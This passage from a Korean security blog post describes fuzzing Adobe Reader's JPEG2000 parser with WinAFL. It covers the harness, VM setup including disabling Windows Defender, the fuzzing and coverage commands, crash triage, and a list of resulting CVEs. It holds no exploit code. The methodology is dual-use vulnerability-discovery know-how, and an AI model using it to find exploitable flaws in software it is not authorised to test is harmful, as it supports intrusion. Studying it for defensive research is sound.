&#xACB0;&#xC815;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/07/04/fabu1ous/50cve/18.png" alt></p><p>&#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; JP2KImageDataDestroy, JP2KImageDestroy, JP2KDecOptDestroy &#xD568;&#xC218;&#xB4E4;&#xC744; &#xD638;&#xCD9C;&#xD574; &#xC800;&#xD76C;&#xAC00; &#xB9CC;&#xB4E0; &#xC624;&#xD504;&#xC81D;&#xD2B8;&#xB4E4;&#xC744; &#xD574;&#xC81C;&#xD574; memory leak&#xC744; &#xBC29;&#xC9C0;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xC791;&#xC5C5;&#xC740; WinAFL&#xB85C; fuzz_iterations&#xAC00; &#xB192;&#xC740; &#xC791;&#xC5C5;&#xC744; &#xD560; &#xB54C; &#xC911;&#xC694;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC790; &#xC774;&#xC81C; &#xC798; &#xC791;&#xB3D9;&#xD558;&#xB294; Harness&#xB97C; &#xC644;&#xC131;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p>&#xC544;&#xC8FC; &#xC0AC;&#xC18C;&#xD55C; &#xC218;&#xC815;&#xC744; &#xD574;&#xC90D;&#xB2C8;&#xB2E4;. JP2KLib&#xC744; &#xB85C;&#xB4DC;&#xD558;&#xACE0; &#xD544;&#xC694;&#xD55C; &#xD568;&#xC218;&#xB97C; &#xBC1B;&#xC544;&#xC624;&#xB294; &#xCD08;&#xAE30;&#xD654; &#xC791;&#xC5C5;&#xC744; &#xBD84;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;. &#xB9E4; &#xC2E4;&#xD589;&#xB9C8;&#xB2E4; &#xCD08;&#xAE30;&#xD654; &#xC791;&#xC5C5;&#xC744; &#xB2E4;&#xC2DC; &#xD574; &#xC904; &#xD544;&#xC694;&#xAC00; &#xC5C6;&#xC73C;&#xB2C8; &#xC774;&#xB97C; &#xBD84;&#xB9AC;&#xD574;&#xC90C;&#xC73C;&#xB85C;&#xC368; &#xC2E4;&#xD589; &#xC18D;&#xB3C4;&#xB97C; &#xD5A5;&#xC0C1;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC0C8;&#xB85C;&#xC6B4; &#xD568;&#xC218;&#xC5D0; fuzzme&#xB77C;&#xB294; &#xC774;&#xB984;&#xC744; &#xC9C0;&#xC5B4;&#xC8FC;&#xACE0; export &#xD574;&#xC90D;&#xB2C8;&#xB2E4;. &#xC720;&#xD6A8;&#xD55C; &#xC624;&#xD504;&#xC14B;&#xC744; &#xAD6C;&#xD558;&#xB294; &#xAC83;&#xBCF4;&#xB2E4; export &#xD558;&#xB294; &#xAC83;&#xC774; &#xD6E8;&#xC52C; &#xC27D;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="Fuzzing-Methodology"><a href="#Fuzzing-Methodology" class="headerlink" title="Fuzzing Methodology"></a>Fuzzing Methodology</h1><ol><li>Basic tests for the harness<ol><li>Stability</li><li>Paths</li><li>Timeouts</li></ol></li><li>Fuzzing Setup</li><li>Initial corpus</li><li>Initial line coverage</li><li>Fuzzing loop<ol><li>Fuzz</li><li>Check coverage / crashes</li><li>cmin &amp; repeat</li></ol></li><li>Triage</li></ol><h1 id="Basic-Tests-for-the-Harness"><a href="#Basic-Tests-for-the-Harness" class="headerlink" title="Basic Tests for the Harness"></a>Basic Tests for the Harness</h1><p>&#xD37C;&#xC9D5;&#xC744; &#xC2DC;&#xC791;&#xD558;&#xAE30; &#xC55E;&#xC11C; &#xBA87; &#xAC00;&#xC9C0; sanity test&#xB97C; &#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xC800; &#xC11C;&#xBC84;&#xC2E4; &#xC628;&#xB3C4;&#xB9CC; &#xB192;&#xC774;&#xB294; &#xC77C;&#xC774; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xC73C;&#xB2C8;. &#xCCAB; &#xBC88;&#xC9F8;&#xB85C; &#xD655;&#xC778;&#xD574;&#xC57C; &#xD560; &#xAC83;&#xC740; &#xD37C;&#xC800;&#xAC00; &#xC0C8;&#xB85C;&#xC6B4; &#xC2E4;&#xD589; path&#xC5D0; &#xB3C4;&#xB2EC;&#xD558;&#xB294;&#xAC00;&#xC785;&#xB2C8;&#xB2E4;. &#xC989;, total path count&#xAC00; &#xAFB8;&#xC900;&#xD788; &#xC0C1;&#xC2B9;&#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xB9CC;&#xC57D; path count&#xAC00; 0&#xC774;&#xAC70;&#xB098; &#xAC70;&#xC758; 0&#xC774;&#xB77C;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xD568;&#xC815;&#xB4E4;&#xC744; &#xC870;&#xC0AC;&#xD574;&#xBD10;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><ul><li>&#xCEF4;&#xD30C;&#xC77C;&#xB7EC;&#xC5D0; &#xC758;&#xD574; &#xD0C0;&#xAC9F;&#xD568;&#xC218;&#xAC00; &#xC778;&#xB77C;&#xC778; &#xCC98;&#xB9AC;&#xB418;&#xC5B4; WinAFL&#xC774; &#xB3C4;&#xB2EC;&#xD558;&#xC9C0; &#xBABB;&#xD55C;&#xB2E4;.</li><li>&#xC778;&#xC790; &#xAC1C;&#xC218;&#xB098; &#xD568;&#xC218; &#xD638;&#xCD9C; &#xADDC;&#xC57D;&#xC774; &#xC798;&#xBABB;&#xB410;&#xB2E4;.</li><li>&#xD0C0;&#xC784;&#xC544;&#xC6C3;&#xC774; &#xB108;&#xBB34; &#xB0AE;&#xC544; harness&#xAC00; &#xB108;&#xBB34; &#xC77C;&#xCC0D; &#xC885;&#xB8CC;&#xB41C;&#xB2E4;.</li></ul><p>&#xD37C;&#xC800;&#xB97C; &#xBA87; &#xBD84; &#xC815;&#xB3C4; &#xC2E4;&#xD589;&#xD55C; &#xB4A4; &#xC548;&#xC815;&#xC131;&#xC744; &#xD655;&#xC778;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC548;&#xC815;&#xC131;&#xC774; &#xB0AE;&#xC544;(80% &#xBBF8;&#xB9CC;) &#xC774;&#xC288;&#xB97C; &#xB514;&#xBC84;&#xAE45;&#xD574;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;. Harness&#xC758; &#xC548;&#xC815;&#xC131;&#xC740; &#xD37C;&#xC800;&#xC758; &#xC131;&#xB2A5;&#xACFC; &#xC9C1;&#xACB0;&#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xB9E4;&#xC6B0; &#xC911;&#xC694;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xD754;&#xD788; &#xBE60;&#xC9C0;&#xB294; &#xD568;&#xC815;&#xB4E4;</p><ul><li>&#xB09C;&#xC218; element&#xB4E4;&#xC744; &#xD655;&#xC778;&#xD574;&#xBD10;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4; &#xBA87;&#xBA87; hash table&#xB4E4;&#xC740; collision&#xC744; &#xBC29;&#xC9C0;&#xD558;&#xAE30; &#xC704;&#xD574; &#xB09C;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; coverage&#xC758; &#xC815;&#xD655;&#xB3C4;&#xB97C; &#xB5A8;&#xC5B4;&#xB728;&#xB9AC;&#xB294; &#xC791;&#xC5C5;&#xC774;&#xBBC0;&#xB85C; &#xB09C;&#xC218;&#xC758; seed&#xB97C; &#xC0C1;&#xC218;&#xAC12;&#xC73C;&#xB85C; &#xACE0;&#xC815;&#xC2DC;&#xD0A4;&#xB294; &#xD328;&#xCE58;&#xB97C; &#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</li><li>&#xBA87;&#xBA87; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xB294; &#xD2B9;&#xC815; global object&#xC5D0; &#xB300;&#xD55C; cach&#xB97C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. nop run&#xC744; &#xD1B5;&#xD574; &#xC774;&#xB97C; &#xBC29;&#xC9C0;&#xD569;&#xB2C8;&#xB2E4;.</li><li>Windows 10 64-bit &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C; &#xB3CC;&#xC544;&#xAC00;&#xB294; 32-bit &#xD0C0;&#xAC9F;&#xC758; stack alignment&#xB294; &#xD56D;&#xC0C1; 8&#xC774; &#xC544;&#xB2D9;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; memcpy&#xB97C; &#xD3EC;&#xD568;&#xD55C; &#xB2E4;&#xB978; AVX &#xCD5C;&#xC801;&#xD654; &#xCF54;&#xB4DC;&#xB4E4;&#xC758; &#xB3D9;&#xC791;&#xC5D0; &#xC601;&#xD5A5;&#xC744; &#xC8FC;&#xBA70; coverage &#xB610;&#xD55C; &#xC601;&#xD5A5;&#xC744; &#xBC1B;&#xC2B5;&#xB2C8;&#xB2E4;. harness&#xC5D0; stack aligne&#xC744; &#xB9DE;&#xCD94;&#xB294; &#xCF54;&#xB4DC;&#xB97C; &#xCD94;&#xAC00;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC73C;&#xB85C; &#xD574;&#xACB0;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul><p>&#xB9CC;&#xC57D; &#xC704; &#xBC29;&#xBC95;&#xC774; &#xBAA8;&#xB450; &#xC2E4;&#xD328;&#xD55C;&#xB2E4;&#xBA74; DynamoRIO&#xB97C; &#xC0AC;&#xC6A9;&#xD574; harness&#xC758; &#xC778;&#xC2A4;&#xD2B8;&#xB7ED;&#xC158;&#xC744; &#xCD94;&#xC801;&#xD558;&#xACE0; output&#xC744; &#xBE44;&#xAD50;&#xD569;&#xB2C8;&#xB2E4;.</p><h1 id="Fuzzing-Setup"><a href="#Fuzzing-Setup" class="headerlink" title="Fuzzing Setup"></a>Fuzzing Setup</h1><p>&#xC800;&#xD76C;&#xB294; &#xB2E4;&#xC74C; &#xACFC; &#xAC19;&#xC740; VM&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><p>8~16 core, 32 GB of RAM, Windows 10 x64</p><p>&#xC800;&#xD76C;&#xB294; <a href="https://sourceforge.net/projects/imdisk-toolkit/">ImDisk toolkit</a>&#xC744; &#xC0AC;&#xC6A9;&#xD574; RAM disk drive&#xB97C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xBE60;&#xB978; &#xD0C0;&#xAC9F;&#xC744; &#xB300;&#xC0C1;&#xC73C;&#xB85C; &#xB514;&#xC2A4;&#xD06C;&#xC5D0; test case&#xB97C; &#xC791;&#xC131;&#xD558;&#xB294; &#xAC83;&#xC740; &#xBCD1;&#xBAA9; &#xD604;&#xC0C1;&#xC744; &#xC720;&#xBC1C;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC785;&#xB2C8;&#xB2E4;.</p><p>Windows Defender &#xB610;&#xD55C; &#xC131;&#xB2A5;&#xC5D0; &#xC545;&#xC601;&#xD5A5;&#xC744; &#xB07C;&#xCE58;&#xB2C8; &#xBE44;&#xD65C;&#xC131;&#xD654;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;. WinAFL&#xC774; &#xC0DD;&#xC131;&#xD558;&#xB294; test case&#xB4E4; &#xC911; Windows Defender&#xC5D0;&#xC11C; &#xC54C;&#xB824;&#xC9C4; exploit&#xC73C;&#xB85C; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xACBD;&#xC6B0;&#xB3C4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/07/04/fabu1ous/50cve/19.png" alt></p><p>Windows Indexing Service&#xB3C4; &#xBE44;&#xD65C;&#xC131;&#xD654;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p><p>&#xD37C;&#xC9D5; &#xB3C4;&#xC911; &#xC2DC;&#xC2A4;&#xD15C;&#xC744; &#xC7AC;&#xC2DC;&#xC791;&#xD558;&#xAC70;&#xB098; &#xD37C;&#xC9D5; &#xD558;&#xB358; dll&#xC744; &#xB300;&#xCCB4;&#xD558;&#xB294; &#xB4F1;&#xC758; &#xBB38;&#xC81C;&#xAC00; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xC73C;&#xB2C8; Windows Update&#xB3C4; &#xBE44;&#xD65C;&#xC131;&#xD654;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p><p>&#xBC84;&#xADF8; &#xD0D0;&#xC0C9;&#xC5D0; &#xB3C4;&#xC6C0;&#xC774; &#xB418;&#xBBC0;&#xB85C; harness &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0; &#xB300;&#xD55C; page heap&#xC740; &#xD65C;&#xC131;&#xD654;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p><p>&#xC18D;&#xB3C4;&#xB294; &#xB290;&#xB9AC;&#xC9C0;&#xB9CC; &#xBC84;&#xADF8; &#xD0D0;&#xC0C9;&#xC5D0; &#xD6A8;&#xACFC;&#xC801;&#xC774;&#xB77C;&#xB294; edge coverage type&#xC744; &#xC0AC;&#xC6A9;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD37C;&#xC9D5;&#xC744; &#xC2DC;&#xC791;&#xD558;&#xB294; &#xBA85;&#xB839;&#xC5B4;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">afl-fuzz.exe -i R:\\jp2k\\<span class="hljs-keyword">in</span> -o R:\\jp2k\\out -t 20000+ -D c:\\DynamoRIO-Windows-7.0.0-RC1\\bin32 -S Slav02 &#x2014; -fuzz_iterations 10000 -coverage_module JP2KLib.dll -target_module adobe_jp2k.exe -target_method fuzzme -nargs 1 -covtype edge &#x2014; adobe_jp2k.exe @@</code></pre><h1 id="Initial-Corpus"><a href="#Initial-Corpus" class="headerlink" title="Initial Corpus"></a>Initial Corpus</h1><p>Harness&#xB97C; &#xC644;&#xC131;&#xD588;&#xB2E4;&#xBA74; &#xC544;&#xB798; &#xBC29;&#xBC95;&#xB4E4;&#xB85C; &#xCD08;&#xAE30; corpus&#xB97C; &#xD655;&#xBCF4;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><ul><li>Online corpuses ( <a href="https://lcamtuf.coredump.cx/afl/demo/">afl corpus</a>, <a href="https://github.com/uclouvain/openjpeg-data">openjpeg-data</a> )</li><li>Test suites from open source projects</li><li>Crawlling google / duckduckgo</li><li>Corpuses from our older fuzzing projects</li></ul><h1 id="Corpus-Minimization"><a href="#Corpus-Minimization" class="headerlink" title="Corpus Minimization"></a>Corpus Minimization</h1><p>&#xB3D9;&#xC77C;&#xD55C; coverage&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xB294; &#xC6A9;&#xB7C9;&#xC774; &#xD070; &#xD30C;&#xC77C;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xD37C;&#xC800;&#xC758; &#xC131;&#xB2A5;&#xC774; &#xC800;&#xD558;&#xB429;&#xB2C8;&#xB2E4;. AFL&#xC740; &#xC774;&#xB97C; &#xD574;&#xACB0;&#xD558;&#xAE30; &#xC704;&#xD574; afl-cmin&#xC744; &#xC0AC;&#xC6A9;&#xD574; corpus&#xB97C; &#xAC04;&#xC18C;&#xD654; &#xC2DC;&#xD0B5;&#xB2C8;&#xB2E4;. WinAFL&#xC740; winafl-cmin.py&#xB77C;&#xB294; &#xD234;&#xC744; &#xC81C;&#xACF5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xD655;&#xBCF4;&#xD55C; &#xBAA8;&#xB4E0; &#xD30C;&#xC77C;&#xC744; winafl-cmin.py&#xC5D0; &#xB123;&#xACE0; &#xAC04;&#xC18C;&#xD654;&#xB41C; corpus&#xB97C; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xAC19;&#xC740; &#xD30C;&#xC77C;&#xC5D0; &#xB300;&#xD574; winafl-cmin&#xC744; &#xB450; &#xBC88; &#xB3CC;&#xB824;&#xBCF4;&#xACE0; &#xAC19;&#xC740; &#xACB0;&#xACFC;&#xAC00; &#xB098;&#xC624;&#xB294;&#xC9C0; &#xBE44;&#xAD50;&#xD574;&#xBD10;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xB9CC;&#xC57D; &#xB450; &#xACB0;&#xACFC;&#xAC00; &#xB2E4;&#xB974;&#xB2E4;&#xBA74; harness&#xAC00; &#xBE44;&#xACB0;&#xC815;&#xB860; &#xBB38;&#xC81C;&#xB97C; &#xC548;&#xACE0; &#xC788;&#xB2E4;&#xACE0; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="Initial-Line-Coverage"><a href="#Initial-Line-Coverage" class="headerlink" title="Initial Line Coverage"></a>Initial Line Coverage</h1><p>Corpus&#xB97C; &#xC5BB;&#xC5C8;&#xC73C;&#xB2C8; &#xC774;&#xC820; line coverage&#xB97C; &#xC0B4;&#xD3B4;&#xBCFC; &#xCC28;&#xB840;&#xC785;&#xB2C8;&#xB2E4;. Line coverage&#xB780; &#xC2E4;&#xC81C;&#xB85C; &#xC2E4;&#xD589;&#xB41C; &#xC5B4;&#xC148;&#xBE14;&#xB9AC; &#xC778;&#xC2A4;&#xD2B8;&#xB7ED;&#xC158;&#xC744; &#xB73B;&#xD569;&#xB2C8;&#xB2E4;. DynamoRIO&#xB97C; &#xC0AC;&#xC6A9;&#xD574; line coverage&#xB97C; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">[dynamoriodir]\\bin32\\drrun.exe -t drcov &#x2014; harness.exe testcase</code></pre><p>&#xAC01; test case&#xC5D0; &#xB300;&#xD574; &#xC704; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xACE0; &#xACB0;&#xACFC;&#xAC12;&#xC744; IDA <a href="https://github.com/gaasedelen/lighthouse">Lighthouse</a>&#xB85C; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/07/04/fabu1ous/50cve/20.png" alt>&#xB294;&#xB370; &#xB3C4;&#xC6C0;&#xC774; &#xB429;&#xB2C8;&#xB2E4;.</p><h1 id="Fuzzing-Cycle"><a href="#Fuzzing-Cycle" class="headerlink" title="Fuzzing Cycle"></a>Fuzzing Cycle</h1><p>&#xB2E4;&#xC74C; &#xB2E8;&#xACC4;&#xB294; &#xB9E4;&#xC6B0; &#xAC04;&#xB2E8;&#xD569;&#xB2C8;&#xB2E4;.</p><ol><li>&#xD37C;&#xC800;&#xB97C; &#xC2E4;&#xD589;&#xD55C;&#xB2E4;.</li><li>Coverage&#xC640; Crash &#xBD84;&#xC11D;</li><li>Coverage &#xC870;&#xC0AC;, cmin &#xADF8;&#xB9AC;&#xACE0; &#xBC18;&#xBCF5;</li></ol><p>&#xD37C;&#xC800;&#xB97C; &#xB3CC;&#xB9AC;&#xB294; &#xAC83;&#xC740; &#xD2B9;&#xBCC4;&#xD788; &#xC5B4;&#xB824;&#xC6B4; &#xC77C;&#xC774; &#xC544;&#xB2D9;&#xB2C8;&#xB2E4;. &#xC704;&#xC5D0;&#xC11C; &#xC124;&#xBA85;&#xD55C; &#xAD6C;&#xC131;&#xB300;&#xB85C; &#xD37C;&#xC800;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xAE30;&#xB9CC; &#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC800;&#xD76C;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xAE30;&#xB2A5;&#xC758; &#xBD07;&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><ol><li>&#xBAA8;&#xB4E0; &#xD37C;&#xC800;&#xC758; &#xC0C1;&#xD0DC;(<a href="http://winafl-whatsapp.py">winafl-whatsapp.py</a>)</li><li>&#xAC01; &#xD37C;&#xC800;&#xC758; &#xC2DC;&#xAC04;&#xC5D0; &#xB530;&#xB978; path &#xBCC0;&#xD654; &#xADF8;&#xB798;&#xD504;</li><li>Crash triage (&#xB2E4;&#xC74C; &#xC139;&#xC158;&#xC5D0;&#xC11C; &#xB2E4;&#xB8F8;)</li><li>&#xBA48;&#xCD98; &#xD37C;&#xC800; &#xC7AC;&#xC2DC;&#xC791;</li></ol><p>&#xC704; &#xC791;&#xC5C5;&#xB4E4;&#xC744; &#xC790;&#xB3D9;&#xD654;&#xD558;&#xB294; &#xAC83;&#xC774; &#xC5BC;&#xB9C8;&#xB098; &#xC911;&#xC694;&#xD55C;&#xC9C0; &#xAD73;&#xC774; &#xC124;&#xBA85;&#xD560; &#xD544;&#xC694;&#xB294; &#xC5C6;&#xACA0;&#xC8E0;? &#xD37C;&#xC9D5;&#xC740; &#xC9C0;&#xB8E8;&#xD558;&#xACE0; &#xC624;&#xB958;&#xAC00; &#xB118;&#xCE58;&#xB294; &#xC791;&#xC5C5;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xD37C;&#xC800;&#xC758; &#xC0C1;&#xD0DC;&#xC640; path&#xB97C; &#xBA87; &#xC2DC;&#xAC04; &#xC8FC;&#xAE30;&#xB85C; &#xD655;&#xC778;&#xD558;&#xACE0; &#xADF8;&#xB798;&#xD504;&#xC5D0; &#xC0C1;&#xC2B9;&#xC138;&#xAC00; &#xBCF4;&#xC778;&#xB2E4;&#xBA74; coverage&#xB97C; &#xC870;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/07/04/fabu1ous/50cve/21.png" alt></p><p>&#xBAA8;&#xB4E0; &#xD37C;&#xC800;&#xC758; &#xBAA8;&#xB4E0; queue&#xB97C; &#xBAA8;&#xC544; cmin&#xC744; &#xAC70;&#xCE58;&#xACE0; &#xADF8; &#xACB0;&#xACFC;&#xB97C; IDA&#xB85C; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;. &#xC0C1;&#xB300;&#xC801;&#xC73C;&#xB85C; coverage&#xAC00; &#xC791;&#xC73C;&#xBA74;&#xC11C; &#xD06C;&#xAE30;&#xAC00; &#xD070; &#xD568;&#xC218;&#xB97C; &#xCC3E;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAC01; &#xD568;&#xC218;&#xC758; &#xAE30;&#xB2A5;&#xC744; &#xC774;&#xD574;&#xD558;&#xB824; &#xB178;&#xB825;&#xD558;&#xACE0; &#xAC01; &#xC0D8;&#xD50C;&#xC774; &#xC5B4;&#xB5A4; &#xAE30;&#xB2A5;&#xC744; &#xD2B8;&#xB9AC;&#xAC70;&#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xBC88; &#xB2E8;&#xACC4;&#xB294; &#xB9E4;&#xC6B0; &#xC911;&#xC694;&#xD569;&#xB2C8;&#xB2E4;. &#xD558;&#xB098;&#xC758; &#xC0D8;&#xD50C;&#xC744; &#xCD94;&#xAC00;&#xD558;&#xACE0; &#xBA87; &#xC2DC;&#xAC04;&#xC758; &#xD37C;&#xC9D5;&#xC744; &#xD1B5;&#xD574; &#xC0C8;&#xB85C;&#xC6B4; &#xCDE8;&#xC57D;&#xC810; 3&#xAC1C;&#xB97C; &#xCC3E;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Coverage&#xAC00; &#xB354; &#xC774;&#xC0C1; &#xB298;&#xC5B4;&#xB098;&#xC9C0; &#xC54A;&#xC744; &#xB54C;&#xAE4C;&#xC9C0; &#xC774; &#xC0AC;&#xC774;&#xD074;&#xC744; &#xBC18;&#xBCF5;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. Coverage&#xAC00; &#xB298;&#xC5B4;&#xB098;&#xC9C0; &#xC54A;&#xB294;&#xB2E4;&#xB294; &#xB73B;&#xC740; &#xD0C0;&#xAC9F;&#xC744; &#xBCC0;&#xACBD;&#xD558;&#xAC70;&#xB098; harness&#xB97C; &#xAC1C;&#xC120;&#xD574;&#xC57C; &#xD55C;&#xB2E4;&#xB294; &#xB73B;&#xC785;&#xB2C8;&#xB2E4;.</p><h1 id="Triage"><a href="#Triage" class="headerlink" title="Triage"></a>Triage</h1><p>Crash&#xB97C; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0A4;&#xB294; test case&#xB97C; &#xC5BB;&#xC73C;&#xBA74; &#xC9C1;&#xC811; crash&#xC640; &#xADF8; &#xC785;&#xB825;&#xAC12;&#xC744; &#xBD84;&#xC11D;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xC911;&#xBCF5;&#xB41C; &#xACB0;&#xACFC;&#xAC00; &#xB9CE;&#xC544; &#xBE60;&#xB974;&#xAC8C; &#xC804;&#xB7B5;&#xC744; &#xBC14;&#xAFE8;&#xC2B5;&#xB2C8;&#xB2E4;. <a href="https://github.com/SkyLined/BugId">Bugld</a>&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xC911;&#xBCF5;&#xB41C; &#xACB0;&#xACFC;&#xB97C; &#xC0DD;&#xB7B5;&#xD558;&#xACE0; unique crash&#xC5D0; &#xB300;&#xD55C; minimize &#xC791;&#xC5C5;&#xC744; &#xC790;&#xB3D9;&#xD654;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/07/04/fabu1ous/50cve/22.png" alt></p><h1 id="What-We-Found"><a href="#What-We-Found" class="headerlink" title="What We Found"></a>What We Found</h1><p>&#xC774;&#xB7F0; &#xC804;&#xB7B5;&#xC744; &#xD1B5;&#xD574; Adobe Reader&#xC640; Adobe Pro&#xC5D0;&#xC11C; 53&#xAC1C;&#xC758; critical &#xD55C; &#xBC84;&#xADF8;&#xB97C; &#xBC1C;&#xACAC;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC800;&#xD76C;&#xB294; &#xB2E4;&#xB978; &#xC774;&#xBBF8;&#xC9C0; &#xD30C;&#xC11C; &#xC2A4;&#xD2B8;&#xB9BC; &#xB514;&#xCF54;&#xB354; &#xB4F1;&#xC5D0; &#xC774;&#xB7EC;&#xD55C; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC801;&#xC6A9;&#xD574;&#xBD24;&#xACE0; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; CVE&#xB4E4;&#xC744; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>CVE-2018-4985, CVE-2018-5063, CVE-2018-5064, CVE-2018-5065, CVE-2018-5068, CVE-2018-5069, CVE-2018-5070, CVE-2018-12754, CVE-2018-12755, CVE-2018-12764, CVE-2018-12765, CVE-2018-12766, CVE-2018-12767, CVE-2018-12768, CVE-2018-12848, CVE-2018-12849, CVE-2018-12850, CVE-2018-12840, CVE-2018-15956, CVE-2018-15955, CVE-2018-15954,CVE-2018-15953, CVE-2018-15952, CVE-2018-15938, CVE-2018-15937, CVE-2018-15936, CVE-2018-15935, CVE-2018-15934, CVE-2018-15933, CVE-2018-15932 , CVE-2018-15931, CVE-2018-15930 , CVE-2018-15929, CVE-2018-15928, CVE-2018-15927, CVE-2018-12875, CVE-2018-12874 , CVE-2018-12873, CVE-2018-12872,CVE-2018-12871, CVE-2018-12870, CVE-2018-12869, CVE-2018-12867 , CVE-2018-12866, CVE-2018-12865 , CVE-2018-12864 , CVE-2018-12863, CVE-2018-12862, CVE-2018-12861, CVE-2018-12860, CVE-2018-12859, CVE-2018-12857, CVE-2018-12839, CVE-2018-8464</p><p>jp2k&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xD55C; &#xCDE8;&#xC57D;&#xC810; &#xC911; &#xD558;&#xB098;&#xB294; <a href="https://www.welivesecurity.com/2018/05/15/tale-two-zero-days/">&#xC2E4;&#xC81C; &#xACF5;&#xACA9;</a>&#xC5D0; &#xC545;&#xC6A9;&#xB418;&#xACE0; &#xC788;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xD655;&#xC778;&#xB418;&#xC5B4; &#xBC1C;&#xACAC;&#xD558;&#xACE0; &#xC5BC;&#xB9C8; &#xC9C0;&#xB098;&#xC9C0; &#xC54A;&#xC544; Adobe&#xC5D0; &#xC81C;&#xBCF4;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xBB3C;&#xB860; Adobe Reader&#xC758; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;&#xC640; Reader Protected Mode&#xB294; exploit&#xC758; &#xBCF5;&#xC7A1;&#xB3C4;&#xB97C; &#xD06C;&#xAC8C; &#xC99D;&#xAC00;&#xC2DC;&#xCF30;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC704;&#xC5D0;&#xC11C; &#xC5B8;&#xAE09;&#xD55C; &#xACF5;&#xACA9; &#xC0AC;&#xB840;&#xCC98;&#xB7FC; &#xC0CC;&#xB4DC; &#xBC15;&#xC2A4;&#xB85C;&#xBD80;&#xD130; 